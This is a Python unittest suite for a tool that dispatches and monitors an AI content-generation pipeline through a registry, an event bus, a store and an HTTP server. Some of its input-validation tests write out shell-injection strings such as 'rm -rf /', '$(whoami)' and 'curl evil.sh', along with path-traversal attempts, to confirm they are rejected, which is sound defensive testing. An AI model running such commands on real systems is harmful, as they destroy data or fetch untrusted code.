#!/usr/bin/env python3
"""
Commander test suite — standard library only.

    python -m unittest discover -s commander/tests -t .

The end-to-end tests drive the real supervisor against the simulator, so the
dispatch path, the interpreter, the event bus and the store are all exercised
together rather than mocked past.
"""

from __future__ import annotations

import json
import os
import tempfile
import time
import unittest
import urllib.error
import urllib.request
from pathlib import Path

from commander import graph, registry
from commander.eventbus import EventBus
from commander.interpreter import LogInterpreter
from commander.runner import DispatchError, Runner
from commander.server import serve
from commander.store import FleetStore

PROJECT_DIR = Path(__file__).resolve().parent.parent.parent

# The simulator sleeps to look like real work; speed it up for the suite.
os.environ.setdefault("COMMANDER_SIM_SPEED", "60")


def wait_for(predicate, timeout=25.0, interval=0.05):
    """Poll until predicate is truthy. Returns the value, or None on timeout."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        value = predicate()
        if value:
            return value
        time.sleep(interval)
    return None


# ── registry ──────────────────────────────────────────────────────────────

class RegistryTests(unittest.TestCase):
    def test_registry_is_structurally_sound(self):
        self.assertEqual(registry.validate(), [])

    def test_every_squad_has_members(self):
        squads_used = {spec.squad for spec in registry.AGENTS}
        for squad in registry.SQUADS:
            self.assertIn(squad.id, squads_used, f"{squad.id} has no agents")

    def test_mission_chain_agents_are_dispatchable(self):
        for agent_id in registry.MISSION_CHAIN:
            self.assertTrue(registry.get(agent_id).dispatchable)

    def test_build_argv_produces_expected_command(self):
        spec = registry.get("mission")
        argv = spec.build_argv({"topic": "Stop Overthinking",
                                "faculty": "Dr. Nova Vale", "no_qa": True})
        self.assertEqual(argv[:4],
                         ["python", "scripts/neuroforge_pipeline.py", "--mode", "full"])
        self.assertIn("--topic", argv)
        self.assertIn("Stop Overthinking", argv)
        self.assertIn("--no-qa", argv)

    def test_flags_are_omitted_when_false(self):
        argv = registry.get("mission").build_argv(
            {"topic": "T", "faculty": "Kai Ren", "no_qa": False})
        self.assertNotIn("--no-qa", argv)

    def test_shell_metacharacters_are_rejected(self):
        spec = registry.get("mission")
        for hostile in ("x; rm -rf /", "$(whoami)", "a && curl evil.sh", "`id`",
                        "a | tee /etc/passwd"):
            with self.subTest(value=hostile):
                with self.assertRaises(ValueError):
                    spec.build_argv({"topic": hostile, "faculty": "Kai Ren"})

    def test_choice_parameters_are_closed(self):
        with self.assertRaises(ValueError):
            registry.get("mission").build_argv(
                {"topic": "T", "faculty": "Someone Else"})

    def test_required_parameters_without_a_default_are_enforced(self):
        # The QA agent needs a file to review and has no sensible default.
        with self.assertRaises(ValueError):
            registry.get("qa").build_argv({"topic": "T", "faculty": "Kai Ren"})

    def test_required_parameters_fall_back_to_their_default(self):
        argv = registry.get("mission").build_argv({"faculty": "Kai Ren"})
        self.assertIn("Stop Overthinking", argv)

    def test_unknown_parameters_are_rejected(self):
        with self.assertRaises(ValueError):
            registry.get("mission").build_argv(
                {"topic": "T", "faculty": "Kai Ren", "sudo": "1"})

    def test_missing_env_treats_placeholders_as_absent(self):
        spec = registry.get("mission")
        self.assertEqual(registry.missing_env(spec, {"ANTHROPIC_API_KEY": "sk-real"}), [])
        self.assertEqual(
            registry.missing_env(spec, {"ANTHROPIC_API_KEY": "sk-PLACEHOLDER"}),
            ["ANTHROPIC_API_KEY"])
        self.assertEqual(registry.missing_env(spec, {}), ["ANTHROPIC_API_KEY"])


# ── architecture graph ────────────────────────────────────────────────────

class GraphTests(unittest.TestCase):
    def setUp(self):
        self.ir = graph.build()

    def test_ir_validates_without_errors_or_warnings(self):
        report = graph.validate(self.ir)
        self.assertEqual(report["errors"], [])
        self.assertEqual(report["warnings"], [])

    def test_every_agent_appears_exactly_once(self):
        ids = [node["id"] for node in self.ir["nodes"]]
        self.assertEqual(sorted(ids), sorted(spec.id for spec in registry.AGENTS))

    def test_layout_is_deterministic(self):
        again = graph.build()
        self.assertEqual(json.dumps(self.ir, sort_keys=True),
                         json.dumps(again, sort_keys=True))

    def test_external_systems_are_only_dependencies(self):
        external = {n["id"] for n in self.ir["nodes"] if n["kind"] == "external"}
        for edge in self.ir["edges"]:
            if edge["to"] in external:
                self.assertEqual(edge["kind"], graph.EDGE_DEPENDENCY, edge["id"])

    def test_validator_catches_overlapping_nodes(self):
        broken = json.loads(json.dumps(self.ir))
        broken["nodes"][1]["x"] = broken["nodes"][0]["x"]
        broken["nodes"][1]["y"] = broken["nodes"][0]["y"]
        report = graph.validate(broken)
        self.assertFalse(report["ok"])
        self.assertTrue(any("overlap" in e for e in report["errors"]))

    def test_validator_catches_dangling_edges(self):
        broken = json.loads(json.dumps(self.ir))
        broken["edges"][0]["to"] = "does_not_exist"
        report = graph.validate(broken)
        self.assertFalse(report["ok"])
        self.assertTrue(any("unknown node" in e for e in report["errors"]))

    def test_validator_catches_labels_over_nodes(self):
        broken = json.loads(json.dumps(self.ir))
        labelled = next(e for e in broken["edges"] if e.get("label"))
        node = broken["nodes"][0]
        labelled["label_point"] = [node["x"] + node["w"] / 2, node["y"] + node["h"] / 2]
        report = graph.validate(broken)
        self.assertFalse(report["ok"])
        self.assertTrue(any("label overlaps" in e for e in report["errors"]))

    def test_state_is_stamped_onto_nodes(self):
        ir = graph.build({"research": {"status": "running", "detail": "brief"}})
        node = next(n for n in ir["nodes"] if n["id"] == "research")
        self.assertEqual(node["state"]["status"], "running")


# ── log interpreter ───────────────────────────────────────────────────────

class InterpreterTests(unittest.TestCase):
    def setUp(self):
        self.interpreter = LogInterpreter("mission")

    def kinds(self, line):
        return [event["kind"] for event in self.interpreter.feed(line)]

    def first(self, line, kind):
        for event in self.interpreter.feed(line):
            if event["kind"] == kind:
                return event
        return None

    def test_agent_banner_opens_a_stage(self):
        event = self.first("🔬 RESEARCH AGENT — Starting", "stage_start")
        self.assertIsNotNone(event)
        self.assertEqual(event["agent"], "research")
        self.assertEqual(event["stage"], "Research Agent")

    def test_acronyms_keep_their_capitalisation(self):
        event = self.first("🔍 QA AGENT — Reviewing Funnel Copy", "stage_start")
        self.assertEqual(event["stage"], "QA Agent")
        self.assertEqual(event["agent"], "qa")

    def test_switching_agents_closes_the_previous_stage(self):
        self.interpreter.feed("🔬 RESEARCH AGENT — Starting")
        kinds = self.kinds("📐 BOOK ARCHITECT AGENT — Starting")
        self.assertIn("stage_end", kinds)
        self.assertIn("stage_start", kinds)

    def test_saved_lines_become_artifacts(self):
        event = self.first("  ✓ Saved: ./output/topic/01_research_brief_1.md", "artifact")
        self.assertEqual(event["path"], "./output/topic/01_research_brief_1.md")
        self.assertFalse(event["is_qa"])

    def test_qa_reports_are_flagged_as_such(self):
        event = self.first("  ✓ Saved: ./output/t/01_research_brief_QA_1.md", "artifact")
        self.assertTrue(event["is_qa"])

    def test_scores_are_extracted_and_normalised(self):
        event = self.first("✅ Research brief complete. QA Score: 42/50", "score")
        self.assertEqual(event["score"], 42)
        self.assertEqual(event["label"], "Research Brief")
        self.assertFalse(event["failed"])

    def test_low_scores_are_flagged_as_failures(self):
        event = self.first("⚠️  Blueprint failed QA (30/50). Review before continuing.",
                           "score")
        self.assertEqual(event["score"], 30)
        self.assertTrue(event["failed"])

    def test_average_scores_are_marked_as_roll_ups(self):
        event = self.first("  Average QA Score:     43/50", "score")
        self.assertTrue(event["rollup"])

    def test_resumed_steps_are_reported_as_skipped(self):
        event = self.first("  ↩ Resuming Research Brief from: 01_research_brief_9.md",
                           "stage_skipped")
        self.assertIsNotNone(event)
        self.assertEqual(event["agent"], "research")

    def test_error_lines_are_classified(self):
        events = self.interpreter.feed("❌ Missing AIRTABLE_API_KEY")
        self.assertEqual(events[0]["level"], "error")

    def test_explicit_protocol_is_honoured(self):
        events = self.interpreter.feed(
            'NEUROFORGE_EVENT {"kind": "stage_start", "stage": "Voice pass"}')
        self.assertEqual(events[0]["kind"], "stage_start")
        self.assertEqual(events[0]["stage"], "Voice pass")

    def test_malformed_protocol_degrades_to_a_warning(self):
        events = self.interpreter.feed("NEUROFORGE_EVENT {not json")
        self.assertEqual(events[0]["kind"], "log")
        self.assertEqual(events[0]["level"], "warn")

    def test_close_finishes_an_open_stage(self):
        self.interpreter.feed("🔬 RESEARCH AGENT — Starting")
        events = self.interpreter.close("error")
        self.assertEqual(events[0]["kind"], "stage_end")
        self.assertEqual(events[0]["status"], "error")
        self.assertEqual(self.interpreter.close("ok"), [])


# ── event bus ─────────────────────────────────────────────────────────────

class EventBusTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.bus = EventBus(Path(self.tmp.name) / "events.jsonl")

    def tearDown(self):
        self.tmp.cleanup()

    def test_sequence_numbers_are_monotonic(self):
        seqs = [self.bus.publish("test", index=i)["seq"] for i in range(5)]
        self.assertEqual(seqs, [1, 2, 3, 4, 5])

    def test_replay_returns_only_newer_events(self):
        for i in range(5):
            self.bus.publish("test", index=i)
        replayed = self.bus.replay(since_seq=3)
        self.assertEqual([e["seq"] for e in replayed], [4, 5])

    def test_subscribers_receive_live_events(self):
        sub = self.bus.subscribe()
        self.bus.publish("test", value="hello")
        event = sub.get(timeout=2)
        self.assertEqual(event["value"], "hello")
        self.bus.unsubscribe(sub)
        self.assertEqual(self.bus.subscriber_count, 0)

    def test_events_are_persisted_as_jsonl(self):
        self.bus.publish("test", value=1)
        self.bus.publish("test", value=2)
        lines = (Path(self.tmp.name) / "events.jsonl").read_text().strip().split("\n")
        self.assertEqual(len(lines), 2)
        self.assertEqual(json.loads(lines[1])["value"], 2)

    def test_buffer_is_bounded(self):
        bus = EventBus(None, capacity=10)
        for i in range(50):
            bus.publish("test", index=i)
        self.assertEqual(len(bus.replay(0, limit=1000)), 10)
        self.assertEqual(bus.seq, 50)


# ── store ─────────────────────────────────────────────────────────────────

class StoreTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.store = FleetStore(PROJECT_DIR, Path(self.tmp.name))

    def tearDown(self):
        self.tmp.cleanup()

    def test_run_lifecycle(self):
        self.store.create_run("run_a", "mission", {"topic": "T"}, ["python"])
        self.store.start_stage("run_a", "Research Agent", "research")
        self.store.score_current_stage("run_a", 44)
        self.store.finish_stage("run_a", "Research Agent", "ok")
        run = self.store.get_run("run_a")
        self.assertEqual(run["stages"][0]["score"], 44)
        self.assertEqual(run["stages"][0]["status"], "ok")
        self.assertIsNotNone(run["stages"][0]["finished_at"])

    def test_duplicate_open_stages_are_not_created(self):
        self.store.create_run("run_b", "mission", {}, ["python"])
        self.store.start_stage("run_b", "Research Agent", "research")
        self.store.start_stage("run_b", "Research Agent", "research")
        self.assertEqual(len(self.store.get_run("run_b")["stages"]), 1)

    def test_logs_are_capped(self):
        self.store.create_run("run_c", "mission", {}, ["python"])
        for i in range(1200):
            self.store.append_log("run_c", f"line {i}")
        log = self.store.get_run("run_c")["log"]
        self.assertLessEqual(len(log), 600)
        self.assertEqual(log[-1]["line"], "line 1199")

    def test_runs_survive_a_restart_but_are_not_left_running(self):
        self.store.create_run("run_d", "mission", {}, ["python"])
        self.store.update_run("run_d", status="running")
        reopened = FleetStore(PROJECT_DIR, Path(self.tmp.name))
        self.assertEqual(reopened.get_run("run_d")["status"], "interrupted")

    def test_fleet_snapshot_covers_every_agent(self):
        snapshot = self.store.fleet_snapshot()
        self.assertEqual(len(snapshot["agents"]), len(registry.AGENTS))
        self.assertIn("readiness", snapshot["agents"][0])

    def test_metrics_read_the_qa_database(self):
        metrics = self.store.metrics()
        for key in ("qa_average", "qa_by_agent", "topics", "estimated_spend_usd"):
            self.assertIn(key, metrics)


# ── runner (end to end against the simulator) ─────────────────────────────

class RunnerTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.bus = EventBus(Path(self.tmp.name) / "events.jsonl")
        self.store = FleetStore(PROJECT_DIR, Path(self.tmp.name))
        self.runner = Runner(PROJECT_DIR, self.bus, self.store,
                             max_concurrent=2, simulate=True)

    def tearDown(self):
        self.runner.shutdown(timeout=15)
        self.tmp.cleanup()

    def finished(self, run_id):
        return wait_for(lambda: (
            self.store.get_run(run_id)
            if self.store.get_run(run_id)["status"] not in ("queued", "running")
            else None
        ))

    def test_simulated_mission_completes_and_captures_scores(self):
        run = self.runner.dispatch("mission", {"topic": "Test Topic",
                                               "faculty": "Kai Ren"})
        finished = self.finished(run["id"])
        self.assertIsNotNone(finished, "simulated mission did not finish")
        self.assertEqual(finished["status"], "ok")
        self.assertEqual(finished["exit_code"], 0)
        self.assertEqual(len(finished["scores"]), 5)
        self.assertEqual(len(finished["artifacts"]), 10)
        self.assertTrue(all(30 <= s <= 50 for s in finished["scores"].values()))

    def test_mission_lights_up_each_forge_agent(self):
        run = self.runner.dispatch("mission", {"topic": "Test Topic",
                                               "faculty": "Kai Ren"})
        self.assertIsNotNone(self.finished(run["id"]))
        for agent_id in registry.MISSION_CHAIN:
            with self.subTest(agent=agent_id):
                self.assertIn(self.store.agent_state(agent_id)["status"],
                              ("ok", "warn"))

    def test_events_describe_the_whole_run(self):
        run = self.runner.dispatch("mission", {"topic": "Test Topic",
                                               "faculty": "Kai Ren"})
        self.assertIsNotNone(self.finished(run["id"]))
        types = {event["type"] for event in self.bus.replay(0, limit=5000)}
        for expected in ("run.queued", "run.started", "run.log", "stage.started",
                         "stage.finished", "artifact", "metric", "run.finished",
                         "fleet"):
            self.assertIn(expected, types)

    def test_skipping_qa_produces_no_scores(self):
        run = self.runner.dispatch("mission", {"topic": "Test Topic",
                                               "faculty": "Kai Ren", "no_qa": True})
        finished = self.finished(run["id"])
        self.assertEqual(finished["status"], "ok")
        self.assertEqual(finished["scores"], {})

    def test_unknown_agent_is_refused(self):
        with self.assertRaises(DispatchError):
            self.runner.dispatch("not_an_agent", {})

    def test_external_systems_cannot_be_dispatched(self):
        with self.assertRaises(DispatchError):
            self.runner.dispatch("anthropic_api", {})

    def test_bad_parameters_never_reach_a_subprocess(self):
        with self.assertRaises(ValueError):
            self.runner.dispatch("mission", {"topic": "a; rm -rf /",
                                             "faculty": "Kai Ren"})
        self.assertEqual(self.store.runs(), [])

    def test_live_dispatch_requires_credentials(self):
        runner = Runner(PROJECT_DIR, self.bus, self.store, simulate=False)
        stashed = os.environ.pop("ANTHROPIC_API_KEY", None)
        try:
            with self.assertRaises(DispatchError) as caught:
                runner.dispatch("mission", {"topic": "T", "faculty": "Kai Ren"})
            self.assertIn("ANTHROPIC_API_KEY", str(caught.exception))
        finally:
            if stashed is not None:
                os.environ["ANTHROPIC_API_KEY"] = stashed


# ── HTTP surface ──────────────────────────────────────────────────────────

class ServerTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.server = serve(PROJECT_DIR, host="127.0.0.1", port=0, simulate=True)
        cls.base = f"http://127.0.0.1:{cls.server.server_address[1]}"

    @classmethod
    def tearDownClass(cls):
        cls.server.commander.runner.shutdown(timeout=15)
        cls.server.shutdown()
        cls.server.server_close()

    def get(self, path):
        with urllib.request.urlopen(self.base + path, timeout=10) as response:
            return json.loads(response.read())

    def post(self, path, payload):
        request = urllib.request.Request(
            self.base + path, data=json.dumps(payload).encode(),
            headers={"Content-Type": "application/json"}, method="POST")
        with urllib.request.urlopen(request, timeout=10) as response:
            return response.status, json.loads(response.read())

    def test_health(self):
        self.assertTrue(self.get("/api/health")["ok"])

    def test_fleet_and_graph_are_served(self):
        self.assertEqual(len(self.get("/api/fleet")["agents"]), len(registry.AGENTS))
        payload = self.get("/api/graph")
        self.assertTrue(payload["validation"]["ok"])
        self.assertEqual(payload["registry_errors"], [])

    def test_console_assets_are_served(self):
        for path in ("/", "/static/app.js", "/static/graph.js", "/static/styles.css"):
            with self.subTest(path=path):
                with urllib.request.urlopen(self.base + path, timeout=10) as response:
                    self.assertEqual(response.status, 200)
                    self.assertTrue(response.read())

    def test_path_traversal_is_blocked(self):
        with self.assertRaises(urllib.error.HTTPError) as caught:
            urllib.request.urlopen(f"{self.base}/static/../registry.py", timeout=10)
        self.assertIn(caught.exception.code, (403, 404))

    def test_dispatch_accepts_a_valid_run(self):
        status, payload = self.post("/api/runs", {
            "agent": "mission",
            "params": {"topic": "Server Topic", "faculty": "Luna Hart"},
            "simulate": True,
        })
        self.assertEqual(status, 202)
        run_id = payload["run"]["id"]
        finished = wait_for(lambda: (
            self.get(f"/api/runs/{run_id}")
            if self.get(f"/api/runs/{run_id}")["status"] not in ("queued", "running")
            else None
        ))
        self.assertEqual(finished["status"], "ok")

    def test_dispatch_rejects_hostile_parameters(self):
        with self.assertRaises(urllib.error.HTTPError) as caught:
            self.post("/api/runs", {"agent": "mission",
                                    "params": {"topic": "$(id)", "faculty": "Kai Ren"},
                                    "simulate": True})
        self.assertEqual(caught.exception.code, 400)

    def test_dispatch_rejects_unknown_agents(self):
        with self.assertRaises(urllib.error.HTTPError) as caught:
            self.post("/api/runs", {"agent": "../../etc/passwd", "simulate": True})
        self.assertIn(caught.exception.code, (400, 409))

    def test_missing_run_returns_404(self):
        with self.assertRaises(urllib.error.HTTPError) as caught:
            self.get("/api/runs/run_nope")
        self.assertEqual(caught.exception.code, 404)

    def test_event_stream_replays_from_a_cursor(self):
        self.post("/api/runs", {"agent": "parse_scripts",
                                "params": {"file": "output/x.md", "topic": "T"},
                                "simulate": True})
        wait_for(lambda: self.get("/api/health")["cursor"] > 0)
        request = urllib.request.Request(f"{self.base}/api/events?since=0")
        with urllib.request.urlopen(request, timeout=10) as stream:
            frames = []
            for raw in stream:
                line = raw.decode().strip()
                if line.startswith("data: "):
                    frames.append(json.loads(line[6:]))
                if len(frames) >= 3:
                    break
        self.assertGreaterEqual(len(frames), 3)
        self.assertEqual([f["seq"] for f in frames], sorted(f["seq"] for f in frames))


class AuthTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.server = serve(PROJECT_DIR, host="127.0.0.1", port=0, simulate=True,
                           token="s3cret")
        cls.base = f"http://127.0.0.1:{cls.server.server_address[1]}"

    @classmethod
    def tearDownClass(cls):
        cls.server.commander.runner.shutdown(timeout=10)
        cls.server.shutdown()
        cls.server.server_close()

    def test_requests_without_a_token_are_refused(self):
        with self.assertRaises(urllib.error.HTTPError) as caught:
            urllib.request.urlopen(f"{self.base}/api/fleet", timeout=10)
        self.assertEqual(caught.exception.code, 401)

    def test_bearer_header_is_accepted(self):
        request = urllib.request.Request(
            f"{self.base}/api/fleet", headers={"Authorization": "Bearer s3cret"})
        with urllib.request.urlopen(request, timeout=10) as response:
            self.assertEqual(response.status, 200)

    def test_query_token_is_accepted_for_the_event_stream(self):
        with urllib.request.urlopen(f"{self.base}/api/health?token=s3cret",
                                    timeout=10) as response:
            self.assertEqual(response.status, 200)


if __name__ == "__main__":
    unittest.main(verbosity=2)
